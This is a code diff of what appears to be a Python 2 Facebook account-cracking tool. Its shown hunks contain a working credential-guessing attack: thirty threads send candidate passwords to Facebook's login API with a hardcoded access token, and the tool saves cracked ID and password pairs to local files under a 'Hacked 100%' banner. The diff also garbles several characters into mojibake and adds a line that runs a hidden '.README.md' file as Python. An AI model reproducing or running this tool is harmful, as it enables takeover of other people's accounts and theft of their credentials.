@@ -67,9 +67,9 @@ logo='''
 \033[1;92m                       4P  *r
 \033[1;93m                       4    %
 \033[0;95m?--------------------------------------------?
-\033[0;91m¦\033[0;91mAUTHOR : \033[0;92mTECH ABM                     \033[0;91m      ¦
-\033[0;91m¦\033[0;91mGITHUB :\033[0;92m https://github.com/Tech-abm   \033[0;91m     ¦
-\033[0;91m¦\033[0;91mFB PAGE :\033[0;92m https://m.facebook.com/Techabm \033[0;91m   ¦
+\033[0;91mÂ¦\033[0;91mAUTHOR : \033[0;92mTECH ABM                     \033[0;91m      Â¦
+\033[0;91mÂ¦\033[0;91mGITHUB :\033[0;92m https://github.com/Tech-abm   \033[0;91m     Â¦
+\033[0;91mÂ¦\033[0;91mFB PAGE :\033[0;92m https://m.facebook.com/Techabm \033[0;91m   Â¦
 \033[0;95m?--------------------------------------------?
                                 '''
 
@@ -309,16 +309,16 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92m{Hacked 100%??}  ' + k + c + user + '  »  ' + pass1+'\n'+"\n"
+				print '\x1b[1;92m{Hacked 100%??}  ' + k + c + user + '  Â»  ' + pass1+'\n'+"\n"
 				okb = open('save/successfull.txt', 'a')
-				okb.write(k+c+user+'-•?•-'+pass1+'\n')
+				okb.write(k+c+user+'-â€¢?â€¢-'+pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '\033[1;96m[24Hours] ' + k + c + user + '  »  ' + pass1+'\n'
+					print '\033[1;96m[24Hours] ' + k + c + user + '  Â»  ' + pass1+'\n'
 					cps = open('save/checkpoint.txt', 'a')
-					cps.write(k+c+user+'-•?•-'+pass1+'\n')
+					cps.write(k+c+user+'-â€¢?â€¢-'+pass1+'\n')
 					cps.close()
 					cpb.append(c+user+pass1)
  				else:
@@ -326,16 +326,16 @@ def action():
  				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				    q = json.load(data)
  				    if 'access_token' in q:
- 				        print '\x1b[1;92m{Hacked 100%??}  ' + k + c + user + '  »  ' + pass2+'\n'+"\n"
+ 				        print '\x1b[1;92m{Hacked 100%??}  ' + k + c + user + '  Â»  ' + pass2+'\n'+"\n"
  				        okb = open('save/successfull.txt', 'a')
- 				        okb.write(k+c+user+'-•?•-'+pass2+'\n')
+ 				        okb.write(k+c+user+'-â€¢?â€¢-'+pass2+'\n')
  				        okb.close()
  				        oks.append(c+user+pass2)
  				    else:
  				        if 'www.facebook.com' in q['error_msg']:
- 					        print '\033[1;96m[24Hours] ' + k + c + user + '  »  ' + pass2+'\n'
+ 					        print '\033[1;96m[24Hours] ' + k + c + user + '  Â»  ' + pass2+'\n'
  					        cps = open('save/checkpoint.txt', 'a')
- 					        cps.write(k+c+user+'-•?•-'+pass2+'\n')
+ 					        cps.write(k+c+user+'-â€¢?â€¢-'+pass2+'\n')
  					        cps.close()
  					        cpb.append(c+user+pass2)
                                         else:
@@ -343,16 +343,16 @@ def action():
  				            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				            q = json.load(data)
  				            if 'access_token' in q:
- 				                print '\x1b[1;92m{Hacked 100%??}  ' + k + c + user + '  »  ' + pass3+'\n'+"\n"
+ 				                print '\x1b[1;92m{Hacked 100%??}  ' + k + c + user + '  Â»  ' + pass3+'\n'+"\n"
  				                okb = open('save/successfull.txt', 'a')
- 				                okb.write(k+c+user+'-•?•-'+pass3+'\n')
+ 				                okb.write(k+c+user+'-â€¢?â€¢-'+pass3+'\n')
  				                okb.close()
  				                oks.append(c+user+pass3)
  				            else:
  				                if 'www.facebook.com' in q['error_msg']:
- 					                print '\033[1;96m[24Hours] ' + k + c + user + '  »  ' + pass3+'\n'
+ 					                print '\033[1;96m[24Hours] ' + k + c + user + '  Â»  ' + pass3+'\n'
  					                cps = open('save/checkpoint.txt', 'a')
- 					                cps.write(k+c+user+'-•?•-'+pass3+'\n')
+ 					                cps.write(k+c+user+'-â€¢?â€¢-'+pass3+'\n')
  					                cps.close()
  					                cpb.append(c+user+pass3)
                                                 else:
@@ -360,16 +360,16 @@ def action():
  				                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				                    q = json.load(data)
  				                    if 'access_token' in q:
- 				                        print '\x1b[1;92m{Hacked 100%??}  ' + k + c + user + '  »  ' + pass4+'\n'+"\n"
+ 				                        print '\x1b[1;92m{Hacked 100%??}  ' + k + c + user + '  Â»  ' + pass4+'\n'+"\n"
  				                        okb = open('save/successfull.txt', 'a')
- 				                        okb.write(k+c+user+'-•?•-'+pass4+'\n')
+ 				                        okb.write(k+c+user+'-â€¢?â€¢-'+pass4+'\n')
  				                        okb.close()
  				                        oks.append(c+user+pass4)
  				                    else:
  				                        if 'www.facebook.com' in q['error_msg']:
- 					                        print '\033[1;96m[24Hours] ' + k + c + user + '  »  ' + pass4+'\n'
+ 					                        print '\033[1;96m[24Hours] ' + k + c + user + '  Â»  ' + pass4+'\n'
  					                        cps = open('save/checkpoint.txt', 'a')
- 					                        cps.write(k+c+user+'-•?•-'+pass4+'\n')
+ 					                        cps.write(k+c+user+'-â€¢?â€¢-'+pass4+'\n')
  					                        cps.close()
  					                        cpb.append(c+user+pass4)
 																	
@@ -378,35 +378,13 @@ def action():
 			pass
 		
 	p = ThreadPool(30)
-	p.map(main, id)
-	print 44*'-'
-	print '[?] Process Has Been Completed ....'
-	print '[?] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
-	print('[?] CP File Has Been Saved : save/checkpoint.txt')
-	print """
-\033[1;91m¦¦¦¦¦¦¦+¦¦¦¦¦¦+¦¦¦¦¦¦¦¦+¦¦¦¦¦¦+¦¦¦+¦¦¦¦+¦¦¦¦¦¦¦+¦¦¦¦¦¦+¦
-\033[1;93m¦¦+----+¦¦+--¦¦+¦¦+----+¦¦+--¦¦+¦¦¦¦¦¦++¦¦+----+¦¦+--¦¦+
-\033[1;92m¦¦¦¦¦+¦¦¦¦¦¦¦¦++¦¦¦¦¦+¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦-+¦¦¦¦¦¦+¦¦¦¦¦¦¦¦¦¦
-\033[1;97m¦¦+--+¦¦¦¦+--¦¦+¦¦+--+¦¦¦¦+--¦¦¦¦¦+-¦¦+¦¦¦+--+¦¦¦¦¦¦¦¦¦¦
-\033[1;96m¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦+¦¦¦¦¦¦¦¦¦¦¦¦+¦¦+¦¦¦¦¦¦¦+¦¦¦¦¦¦++
-\033[1;95m+-+¦¦¦¦¦+-+¦¦+-++------++-+¦¦+-++-+¦¦+-++------++-----+¦
-\033[1;96m¦¦¦¦¦¦+¦¦¦+¦¦¦¦¦+¦¦¦¦¦¦+¦¦¦¦¦¦¦¦+
-\033[1;95m¦¦+--¦¦+¦¦¦¦¦¦¦¦¦¦¦+--¦¦+¦¦+----+
-\033[1;94m¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦+¦¦
-\033[1;93m¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦+--+¦¦
-\033[1;92m¦¦¦¦¦¦+++¦¦¦¦¦¦++¦¦¦¦¦¦++¦¦¦¦¦¦¦+
-\033[1;91m+-----+¦¦+-----+¦+-----+¦+------+
-
- \033[1;96mDon't Worry Your CheckPoint ID Will Be Open After 24Hours
-
-•\033[1;95m?•? ? ? ? ? ? ?•?•? ? ? ? ? ? ?•?•.
-: \033[1;91m ....FreakedDude  WhiteTiger....... \033[1;95m :
-•\033[1;95m?•? ? ? ? ? ? ?•?•? ? ? ? ? ? ?•?•.' 
-                WhatsApp Number
-              \033[1;91m +923124788959"""
-	
-	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
-	login()	
-          
+    p.map(main, id)
+    print "\033[1;96m???------------------------------------------???" 
+    print '[?] Process Has Been Completed ....'
+    print '[?] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
+    print('[?] CP File Has Been Saved : save/checkpoint.txt')
+    raw_input('\n[Press Enter To Go Back]')
+    os.system('python2 .README.md')
+        
 if __name__ == '__main__':
-	login()
+    menu()
